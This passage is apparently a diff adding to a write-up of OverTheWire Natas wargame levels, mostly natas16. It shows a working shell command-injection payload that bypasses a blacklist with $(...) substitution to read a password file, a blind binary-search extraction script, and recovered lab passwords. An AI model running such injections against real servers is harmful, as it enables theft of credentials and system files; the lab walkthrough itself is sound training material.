+       out += chr(lo); print(out, flush=True)
+   print('FINAL', out)
+   PY
+   ```
+   The script prints the password as it grows, so a failure at any position is visible immediately. (The `if lo == 32: break` stops when the next position is NUL/space — i.e. past the end of the password.)
+5. **Recovered password:** `Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb`.
+6. **Verify.** `curl -u natas16:Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb http://natas16.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas16:** `Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb`
 - **Verification:** `http://natas16.natas.labs.overthewire.org/` with `natas16:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L15.cast`
@@ -228,6 +594,37 @@ Verification rule used throughout: a password is accepted only if a request to
   # empty <pre> output => prefix matches; full dictionary dump => no match
   # python: binary search over [0-9A-Za-z] for each position (script in the recording)
   ```
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source and the filter.** The level shows the exact blacklist:
+   ```
+   curl -s -u natas16:<pw> http://natas16.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\n' | grep -o 'preg_match([^)]*)'
+   preg_match('/[;|&`\'"]/', $key)
+   ```
+   The value is still interpolated inside **double quotes**: `passthru("grep -i \"$key\" dictionary.txt")`. Inside double quotes, `$(...)` command substitution is still performed by the shell, and `$`, `(`, `)` are not on the blacklist.
+2. **Design a boolean oracle.** Inject a command substitution whose *output* becomes the pattern for the outer grep:
+   ```
+   $(grep ^<prefix> /etc/natas_webpass/natas17)
+   ```
+   - If the inner grep matches, its output (the password) is substituted into the outer grep's argument. The password is not a word in `dictionary.txt`, so the outer grep prints **nothing**.
+   - If the inner grep does not match, the substitution is empty, the outer grep runs with an empty pattern, and it dumps the **whole dictionary** (hundreds of KB).
+3. **Confirm the oracle with one fixed character.**
+   ```
+   curl -s -u natas16:<pw> --data-urlencode 'needle=$(grep ^X /etc/natas_webpass/natas17)' ... | wc -c   # small
+   curl -s -u natas16:<pw> --data-urlencode 'needle=$(grep ^Z /etc/natas_webpass/natas17)' ... | wc -c   # huge
+   ```
+   The recording prints both sizes, which makes the difference unmistakable.
+4. **Binary-search the alphabet per position.** Use a bracket class, which needs no quotes and is not filtered: `grep ^<known prefix>[<range>] /etc/natas_webpass/natas17`. The Python driver splits the candidate alphabet `[0-9A-Za-z]` in half each step:
+   ```
+   python3 - <<'PY'
+   # (script in the recording)
+   # empty(f'$(grep ^{prefix}[{CHARS[lo:mid+1]}] /etc/natas_webpass/natas17)')
+   #   -> True means the next character lies in the low half
+   # then confirm the single character and append it; stop when '^<prefix>$' matches
+   PY
+   ```
+   It also checks `^<prefix>$` after each character, which detects the end of the password without assuming a length.
+5. **Recovered password:** `KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx`.
+6. **Verify.** `curl -u natas17:KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx http://natas17.natas.labs.overthewire.org/` → HTTP 200.
 - **Password for natas17:** `KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx`
 - **Verification:** `http://natas17.natas.labs.overthewire.org/` with `natas17:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L16.cast`
